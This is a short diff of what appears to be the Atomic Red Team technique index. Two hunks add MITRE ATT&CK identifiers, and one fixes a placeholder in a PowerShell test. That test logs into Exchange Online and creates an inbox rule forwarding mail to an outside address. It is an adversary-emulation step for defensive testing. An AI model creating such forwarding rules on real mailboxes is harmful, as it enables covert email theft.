@@ -27503,6 +27503,7 @@ execution:
       - User
       - SYSTEM
       x_mitre_remote_support: true
+      identifier: T1559
     atomic_tests: []
   T1204.003:
     technique:
@@ -42069,7 +42070,7 @@ collection:
           $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
           $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
           Connect-ExchangeOnline -Credential $creds
-          New-InboxRule -Name "#{rule_name}" -ForwardTo "{#forwarding_email}"
+          New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"
         cleanup_command: |
           $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
           $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
@@ -51289,6 +51290,7 @@ discovery:
       - 'Cloud Storage: Cloud Storage Metadata'
       x_mitre_attack_spec_version: 2.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1580
     atomic_tests: []
   T1217:
     technique:
